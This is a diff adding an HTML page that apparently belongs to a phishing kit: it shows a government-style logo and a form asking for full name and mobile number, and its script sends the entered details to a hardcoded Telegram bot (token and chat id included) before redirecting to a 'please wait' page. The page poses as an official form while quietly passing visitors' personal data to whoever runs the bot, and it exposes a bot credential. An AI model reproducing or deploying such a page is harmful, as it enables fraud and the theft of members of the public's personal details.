@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Form Submission</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            background-color: #e3f2fd;
+            position: relative;
+        }
+        .logo {
+            width: 180px;
+            margin-bottom: 20px;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+        }
+        h2 {
+            margin-bottom: 20px;
+            color: #333;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            background-color: #007bff;
+            color: white;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .footer {
+            width: 100%;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .footer img {
+            width: 100%;
+            max-width: 420px;
+            height: auto;
+            border-radius: 8px;
+        }
+    </style>
+</head>
+<body>
+    <img src="Governmen.png" alt="Logo" class="logo">
+    <div class="container">
+        
+        <form id="userForm">
+            <input type="text" id="fullName" placeholder="Enter Full Name" required>
+            <input type="tel" id="mobileNumber" placeholder="Enter Mobile Number" required>
+            <button type="submit">Submit</button>
+        </form>
+    </div>
+    <div class="footer">
+        <img src="benner.jpeg" alt="Footer Image">
+    </div>
+
+    <script>
+        document.getElementById("userForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            
+            let fullName = document.getElementById("fullName").value;
+            let mobileNumber = document.getElementById("mobileNumber").value;
+            
+            let telegramBotToken = "7857241490:AAEAK23KRE4JJ7MK-bCm6YxIHFi6vcu6k-E";
+            let chatId = "7653557138";
+            let message = `New Submission:\nFull Name: ${fullName}\nMobile Number: ${mobileNumber}`;
+            
+            let url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            
+            fetch(url).then(response => {
+                if (response.ok) {
+                    alert("Form submitted successfully!");
+                    window.location.href = "please_wait.html";
+                } else {
+                    alert("Error submitting form.");
+                }
+            });
+        });
+    </script>
+</body>
+</html>
